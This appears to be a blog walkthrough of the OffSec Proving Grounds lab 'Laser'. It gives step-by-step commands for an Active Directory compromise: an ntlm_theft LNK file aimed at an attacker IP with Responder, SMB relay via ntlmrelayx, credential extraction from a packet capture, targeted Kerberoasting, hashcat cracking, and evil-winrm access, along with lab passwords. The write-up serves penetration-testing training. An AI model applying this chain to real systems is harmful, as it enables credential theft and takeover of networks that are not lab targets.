---
title: Laser
date: 2026-07-17T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - venv
  - python
  - Active-Directory
  - Impacket
  - smb
  - smb-relay-attack
  - windows
  - winrm
  - bloodhound
  - 
categories:
  - Pentesting
  - Offsec
  - Windows
description: "This guide provides readers with the solution to the Proving Grounds Lab: Laser"
---
## X.X.X.172

Eric.Wallows
EricLikesRunning800

![](Screenshot%202026-07-15%20at%2007.09.42.png)

![](Screenshot%202026-07-15%20at%2007.07.44.png)
![](Screenshot%202026-07-15%20at%2007.50.36.png)

DC01  
laser.com

## X.X.X.173

![](Screenshot%202026-07-15%20at%2007.09.03.png)

![](Screenshot%202026-07-15%20at%2007.08.13.png)

MS01

## X.X.X.174

![](Screenshot%202026-07-15%20at%2007.08.45.png)

![](Screenshot%202026-07-15%20at%2007.08.29.png)

MS02

------------------- 

Bloodhound:  
bloodhound-python -u "Eric.Wallows" -p 'EricLikesRunning800' -d laser.com -c all --zip -ns 192.168.177.172

![](Screenshot%202026-07-17%20at%2010.08.56.png)

---------------

We have something....  
http://driverevive.com.au/offsec/windows/nara/ (very cool to be able to link to my own site for answers)

We are able to upload to a smb server. 

Clone this repo:  
git clone https://github.com/Greenwolf/ntlm_theft && cd ntlm_theft

Create the lnk file:  
python3 ntlm_theft.py -g lnk -s 192.168.45.185 -f Bonus

start responder:  
sudo responder  -I tun0 -dwv 

upload it and wait for your hash... 

![](Screenshot%202026-07-15%20at%2009.38.57.png)

![](Screenshot%202026-07-15%20at%2009.42.55.png)

carl.dean

hashcat -m 5600 carl /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

------------

So, this is actually a *smb* relay attack 

Turn off smb using the config file at:  
`sudo vim /etc/responder/Responder.conf`

![](Screenshot%202026-07-17%20at%2009.59.43.png)

sudo responder -I tun0 -dvw

![](Screenshot%202026-07-15%20at%2013.28.46.png)

Start ntmlrelayx: 
impacket-ntlmrelayx -tf target  -smb2support -i

![](Screenshot%202026-07-15%20at%2013.29.35.png)

You will see some errors, just wait. 

![](Screenshot%202026-07-15%20at%2013.30.19.png)

nc 127.0.01 11001

![](Screenshot%202026-07-15%20at%2013.27.27.png)


`use C$`

Once you have the high priv smb account, look though the file system for a pcapng file

`get traffic-capture-latest.pcapng`

Load it into wireshark:  
`wireshark traffic-capture-latest.pcapng

![](Screenshot%202026-07-15%20at%2015.46.32.png)

yulia.weber
Yulia@Laser777

![](Screenshot%202026-07-15%20at%2016.00.26.png)

xfreerdp3 /v:192.168.213.172 /u:yulia.weber   /p:Yulia@Laser777 

![](Screenshot%202026-07-15%20at%2016.06.31.png)

![](Screenshot%202026-07-15%20at%2016.06.12.png)

![](Screenshot%202026-07-17%20at%2009.40.49.png)

git clone https://github.com/ShutdownRepo/targetedKerberoast.git
cd targetedKerberoast
python -m venv .venv
source .venv/bin/activate
pip3 install -r requirements.txt

![](Screenshot%202026-07-17%20at%2009.43.39.png)

Make use you have the host file updated.

sudo vim /etc/hosts

![](Screenshot%202026-07-17%20at%2009.50.39.png)

python targetedKerberoast.py -v -d 'laser.com' -u 'yulia.weber' -p 'Yulia@Laser777'

![](Screenshot%202026-07-17%20at%2009.45.11.png)

https://hashcat.net/wiki/doku.php?id=example_hashes

![](Screenshot%202026-07-17%20at%2010.18.26.png)

hashcat -m 13100 boris /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best66.rule

![](Screenshot%202026-07-17%20at%2009.49.34.png)

evil-winrm -i 192.168.213.174 -u boris.crawford -p zxcvbnm

![](Screenshot%202026-07-17%20at%2009.39.41.png)

Busted!